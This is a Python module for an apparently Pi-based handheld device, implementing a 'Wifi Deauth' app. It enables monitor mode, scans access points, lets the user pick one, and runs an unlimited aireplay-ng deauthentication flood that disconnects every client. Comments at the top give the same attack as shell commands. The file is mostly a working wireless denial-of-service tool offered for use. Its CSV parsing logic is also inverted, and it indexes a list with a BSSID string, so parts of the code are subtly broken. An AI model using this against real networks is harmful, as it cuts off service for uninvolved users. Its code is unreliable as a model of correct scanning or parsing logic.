# sudo airmon-ng start wlan0
# iwconfig check if monitor mode is enabled

# get all bssid
# sudo airodump-ng wlan0mon --output-format csv -w /tmp/scan

# disconnect all clients
# sudo aireplay-ng --deauth 0 -a BSSID wlan0mon

from PiPerW.apps.app_interface import AppInterface
from PiPerW.pheripherals import Pheripherals
from PiPerW.display import Display
from PiPerW.helpers import Log, Config
from PiPerW.utils.Menu import Menu
import os, time, subprocess
import csv
import shutil
from datetime import datetime

display = Display()
pheripherals = Pheripherals()



class App(AppInterface):
    
    name = "Wifi Deauth"
    version = "0.1"
    
    def __init__(self):
        super().__init__(self.name, self.version)
        self.menu = None
        self.ap = []
        
    def init(self):
        self.screen_and_log("Initializing Wifi Deauth","w")
        time.sleep(1)
        
                
        # checking if old csv files are generated
        for file_name in os.listdir("PiPerW/tmp"):
            if file_name.endswith(".csv"):
                os.remove(f"PiPerW/tmp/{file_name}")
        
        
        self.screen_and_log("Killing conflicting processes")
        process_kill =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

        self.screen_and_log("Enabling Monitor Mode")
        monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", Config['network']['interface']])
        
        time.sleep(5)
        
        self.screen_and_log("Checking if monitor mode is enabled")
        res = os.popen("iwconfig").read()
        if "mon" not in res:
            self.screen_and_log("Error enabling monitor mode not enabled, Error 4","e")
            raise SystemError("Error enabling monitor mode not enabled, Error 4")
        
        
        self.screen_and_log("Scanning for networks\n\nPress any key to stop")
        scan = subprocess.run(["sudo", "airodump-ng", Config['network']['interface'], "--output-format", "csv", "-w", "PiPerW/tmp"])
        
        pheripherals.await_any_key_press()
        
        self.screen_and_log("Stopping scan")
        scan = subprocess.run(["sudo", "killall", "airodump-ng"])
        
        
        fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
        with open('PiPerW/tmp/scan-01.csv', 'r') as csvfile:
            reader = csv.DictReader(csvfile, fieldnames)
            for row in reader:
                if row['BSSID'] != "BSSID":
                    pass
                elif row['BSSID'] == "Station MAC":
                    break
                else:
                    if(row['BSSID'] not in self.ap):
                        self.ap.append(row)
                        
        self.screen_and_log("Select the BSSID to deauth\n\nPress any key to continue")
        pheripherals.await_any_key_press()
        
        bssid = []
        for i in self.ap:
            bssid.append(i['BSSID'])
        
        selector = Menu(display.width, display.height, bssid)
        
        display.draw(selector.generate())
        while True:
            key = pheripherals.get_key()
            if key == "up":
                selector.previous()
                display.draw(selector.generate())
            elif key == "down":
                selector.next()
                display.draw(selector.generate())
            elif key == "select":
                break
            elif key == "back":
                self.screen_and_log("Exiting\n\nPress any key to continue")
                pheripherals.await_any_key_press()
                return
            
        selected = selector.get_selected()
        self.screen_and_log("Deauthing:\n{}".format(selected))
        
        # change to desired channel
        self.screen_and_log("Changing to desired channel")
        channel = subprocess.run(["sudo", "iwconfig", Config['network']['interface']+"mon", "channel", self.ap[selected]['channel']])
        
        # deauth        
        deauth = subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", selected, Config['network']['interface']+"mon"])
        
        self.screen_and_log("Executing deauth\n\nPress any key to stop")
        
        while True:
            self.screen_and_log("Executing deauth\n\nPress any to stop")
            pheripherals.await_any_key_press()
            display.text("Press back again to confirm stop")
            key = pheripherals.get_key()
            if key == "back":
                self.screen_and_log("Stopping deauth")
                subprocess.run(["sudo", "killall", "aireplay-ng"])
                break
        
            
            

        
     
        
    def screen_and_log(self, message, type="i"):
        if type == "i":
            Log.info(message)
        elif type == "w":
            Log.warning(message)
        elif type == "e":
            Log.error(message)            
        display.text(message)

    def run(self):
        self.init()